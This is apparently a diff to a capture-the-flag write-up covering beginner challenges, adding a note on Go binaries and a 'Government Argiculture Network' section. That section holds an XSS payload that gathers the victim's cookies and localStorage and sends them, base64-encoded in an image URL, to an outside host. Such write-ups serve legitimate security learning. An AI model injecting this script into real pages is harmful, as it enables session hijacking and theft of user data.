@@ -39,11 +39,13 @@ the Go programming language.
 
 I spent quite some time trying to decompile and debug the binary, with limited
 success. The only significant discovery I made is that the binary uses the
-`net` package, indicating that it may connect to remote servers. Reading the
-PDF document again, I noticed that it mentions something about the security of
-connection. I started Wireshark but I didn't manage to find anything
-interesting. I then tried to look for a domain-like strings using `strings` and
-`grep` as explained in the first quest, and I found
+`net` package, indicating that it may connect to remote servers. Note that the
+list of package a Go program uses are listed in the `main.init` procedure.
+
+Reading the PDF document again, I noticed that it mentions something about the
+security of connection. I started Wireshark but I didn't manage to find
+anything interesting. I then tried to look for a domain-like strings using
+`strings` and `grep` as explained in the first quest, and I found
 `satellite.ctfcompetition.com:1337`. Connecting with a browser didn't work, but
 `netcat` did:
 
@@ -108,4 +110,22 @@ And there is the flag. As a cleanup, the image can be unmounted with:
 
 ```
 $ sudo umount family
+```
+
+# Government Argiculture Network
+
+```HTML
+<script>
+    (() => {
+        const payload = {
+            cookie: document.cookie,
+            localStorage,
+        };
+        const img = document.createElement("img");
+        img.src = "https://legacy.hugoxu.com/image.png?" + btoa(JSON.stringify(payload));
+        document.documentElement.append(img);
+    })();
+</script>
+
+<img src="https://legacy.hugoxu.com/image.png" />
 ```
